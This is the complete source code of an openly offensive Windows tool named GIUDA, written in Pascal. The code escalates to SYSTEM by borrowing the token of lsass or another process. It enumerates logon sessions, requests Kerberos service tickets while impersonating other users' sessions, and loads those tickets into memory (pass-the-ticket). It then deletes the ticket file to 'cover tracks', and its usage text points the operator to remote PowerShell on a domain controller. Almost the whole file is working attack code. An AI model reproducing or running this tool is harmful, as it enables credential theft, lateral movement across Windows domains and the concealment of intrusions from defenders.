{$mode delphi}{$H+}
program giuda;

uses sysutils,windows,classes,uadvapi32,kerberos,usecur32,upsapi;

var
  ret,parampos:dword;
  ticket,luid,pid,params:string;
  dw,inhandle:dword;
  pb:pbyte;
  save:boolean=false;



procedure verbose(s:string;yn:integer);
begin
 if yn<>0 then writeln(s);
 //else future scope
end;

function accattivalo(cmdtorun: string;pid:string;params:string):boolean;
var
  StartupInfo: TStartupInfoW;
  ProcessInformation: TProcessInformation;
  i:byte;
begin
 ZeroMemory(@StartupInfo, SizeOf(TStartupInfoW));
 FillChar(StartupInfo, SizeOf(TStartupInfoW), 0);
 StartupInfo.cb := SizeOf(TStartupInfoW);
 StartupInfo.lpDesktop := 'WinSta0\Default';
 verbose('Trying all Integrity levels from TOP',1);
 for i:=4 downto 0 do
   begin
   result:= CreateProcessAsSystemW_Vista(PWideChar(WideString(cmdtorun)),PWideChar(WideString(params)),NORMAL_PRIORITY_CLASS,nil,pwidechar(widestring(GetCurrentDir)),StartupInfo,ProcessInformation,TIntegrityLevel(i),strtoint(pid ));
   if result then
      begin
       verbose('Running: '+cmdtorun+' '+params,1);
       verbose('New ProcessID:'+inttostr(ProcessInformation.dwProcessId ),1);
       verbose('Integrity '+inttostr(i),1);
       exit;
      end;
   end;
 verbose('Failed with CreateProcess,'+inttostr(getlasterror),1)
end;




procedure main;
var
  sysdir:Pchar;
  debugpriv:boolean;
begin
  verbose(' :. fox aka calipendula',1);
  verbose('GIUDA 2023072100',1);
  writeln();

  if paramcount>0 then
  begin
   getmem(sysdir,Max_Path );
   GetSystemDirectory(sysdir, MAX_PATH - 1);
   debugpriv:=EnableDebugPriv('SeDebugPrivilege');
   if (not debugpriv) and (pos('-ptt',cmdline)=0) then
     begin
      writeln('You need Administrative privileges');
      writeln('Aborting...');
      //exit;
     end;
  end;

  if (paramcount=0) then
  begin
   verbose('To spawn a cmd.exe as SYSTEM',1);
   verbose('C:\> GIUDA -runaslsass',1);
   writeln('or');
   verbose('C:\> GIUDA -runaspid:PID',1);
   writeln();
   verbose('To query active LUIDs',1);
   verbose('C:\> GIUDA -askluids',1);
   writeln();
   verbose('To ask a TGS',1);
   verbose('C:\> GIUDA -gettgs -luid:0xNNNNN -msdsspn:LDAP/DCNAME',1);
   verbose('C:\> GIUDA -gettgs -luid:0xNNNNN -msdsspn:HTTP/DCNAME -save',1);
   writeln();
   verbose('Example:',1);
   verbose('-runaslsass => to become SYSTEM',1);
   verbose('-askluids => to get all LUIDs',1);
   verbose('-gettgs and -luid:0xNNNNN and -msdsspn:HTTP/DCNAME => to get and PASS a tgs',1);
   verbose('-gettgs and -luid:0xNNNNN and -msdsspn:HTTP/DCNAME -save => to get and SAVE a tgs',1);
   verbose('Open a Powershell and...',1);
   verbose('[PS] C:\> Enter-PSsession -computername DCNAME',1);
   verbose('Enjoy GIUDA',1);
  end;



  parampos:=pos('-msdsspn',cmdline);
  if parampos>0 then
       begin
        params:=copy(cmdline,parampos,strlen(cmdline));
        params:=stringreplace(params,'-msdsspn:','',[rfReplaceAll, rfIgnoreCase]);
        if pos(' ',params)>0 then params:=copy(params,0,pos(' ',params)-1);
       end;

  parampos:=pos('-runaspid',cmdline);
  if parampos>0 then
     begin
      pid:=copy(cmdline,parampos,strlen(cmdline));
      pid:=stringreplace(pid,'-runaspid:','',[rfReplaceAll, rfIgnoreCase]);
      if pos(' ',pid)>0 then pid:=copy(pid,0,pos(' ',pid)-1);
      if pid='' then
         begin
          verbose('Check your syntax, PID is empty',1);
          exit;
         end;
      if accattivalo('cmd.exe',pid,params)
         then verbose('Giuda Opened CMD as GOD...',1)
         else verbose('Error, not good...',1);
     end;

  parampos:=pos('-ticket',cmdline);
  if parampos>0 then
     begin
      ticket:=copy(cmdline,parampos,strlen(cmdline));
      ticket:=stringreplace(ticket,'-ticket:','',[rfReplaceAll, rfIgnoreCase]);
      if pos(' ',ticket)>0 then ticket:=copy(ticket,0,pos(' ',ticket)-1);
      if ticket='' then
         begin
          verbose('Check your syntax, TICKET is empty',1);
          exit;
         end;
     end;

  parampos:=pos('-runaslsass',cmdline);
  if parampos>0 then
     begin
      pid:=inttostr(upsapi._EnumProc2('lsass.exe'));
      if accattivalo('cmd.exe',pid,params)
         then verbose('Giuda Opened CMD as GOD...',1)
         else verbose('Error, not good...',1);
     end;

  parampos:=pos('-luid:',cmdline);
  if parampos>0 then
  begin
       luid:=copy(cmdline,parampos,255);
       luid:=stringreplace(luid,'-luid:','',[rfReplaceAll, rfIgnoreCase]);
       delete(luid,pos(' ',luid),255);
  end;

  parampos:=pos('-save',cmdline);
  if parampos>0 then
  begin
       save:=true;
  end;

  parampos:=pos('-gettgs',cmdline);
  if parampos>0 then
   begin
   if luid='' then luid:='0';

   if luid<>'' then
      if copy(luid,0,2) = '0x' then luid:=stringreplace(luid,'0x','$',[rfignorecase])
                               else luid:='$'+luid;
   writeln(luid);
   verbose('[!] Giuda betrays for a few coins',1);
   verbose('Asking a TGS impersonating LUID:'+luid+' for MSDSSPN:'+params,1);
   if kuhl_m_kerberos_init=0 then
      begin
       kuhl_m_kerberos_ask(params,true,strtoint(luid)) ;
       verbose('[!] Giuda spilled the name',1);
       kuhl_m_kerberos_clean ;
      end;
   if not save then
      begin
       inhandle:=thandle(-1);
       inhandle := CreateFile(pchar('ticket.kirbi'), GENERIC_READ , FILE_SHARE_READ , nil, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
       dw := GetFileSize(inhandle,nil)  ;
       pb:=allocmem(dw);ret:=0;
       if inhandle<>thandle(-1) then
        begin
         verbose('Loading TGS',1);
         ReadFile(inhandle,pb^,dw,ret,nil);
        end;
       if inhandle<>thandle(-1) then closehandle(inhandle);
       if (ret<>0) then
        begin
         if kuhl_m_kerberos_init=0 then
          begin
           kuhl_m_kerberos_use_ticket(pb,ret,0);
           verbose('[!] Giuda collects the coins and Pass the Ticket',1);
           kuhl_m_kerberos_clean ;
          end;
         end;
        deletefile('ticket.kirbi');
        verbose('[!] Giuda betrayed and covered tracks',1);

      end
   else verbose('Ticket saved as TICKET.KIRBI',1);

  end;

  parampos:=pos('-ptt',cmdline);
  if parampos>0 then
   begin
   if ticket='' then
      begin
       verbose('Please specify a TICKET file',1);
       exit;
      end;
   if not FileExists(ticket) then
      begin
       verbose('Ticket file '+ticket+' doesn''t exists',1);
       verbose('Please check filename',1);
       exit;
      end;
   verbose('[!] Giuda accepted few coins',1);
   inhandle:=thandle(-1);
   inhandle := CreateFile(pchar(ticket), GENERIC_READ , FILE_SHARE_READ , nil, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
   dw := GetFileSize(inhandle,nil)  ;
   pb:=allocmem(dw);ret:=0;
   if inhandle<>thandle(-1) then
      begin
       verbose('Loading TGS',1);
       ReadFile(inhandle,pb^,dw,ret,nil);
      end;
   if inhandle<>thandle(-1) then closehandle(inhandle);
   if ret<>0 then
     begin
     if kuhl_m_kerberos_init=0 then
        begin
         verbose('[!] Giuda collects the coins and Pass the Ticket',1);
         kuhl_m_kerberos_use_ticket(pb,ret,0);
         kuhl_m_kerberos_clean ;
        end;
     end;
    verbose('Ticket loaded in memory',1);
    verbose('[!] Giuda betrayed',1);
   end;


  parampos:=pos('-askluids',cmdline);
  if parampos>0 then
  begin
   params:=copy(cmdline,parampos,strlen(cmdline));
   params:=stringreplace(params,'-askluids:','',[rfReplaceAll, rfIgnoreCase]);
   luid:='0';
   if kuhl_m_kerberos_init=0 then
      begin
      GetActiveUserNames(@callback_enumlogonsession);
//      kuhl_m_kerberos_list(strtoint(luid)) ;
      kuhl_m_kerberos_clean ;
      end;
   end;

end;

begin
   main;
end.


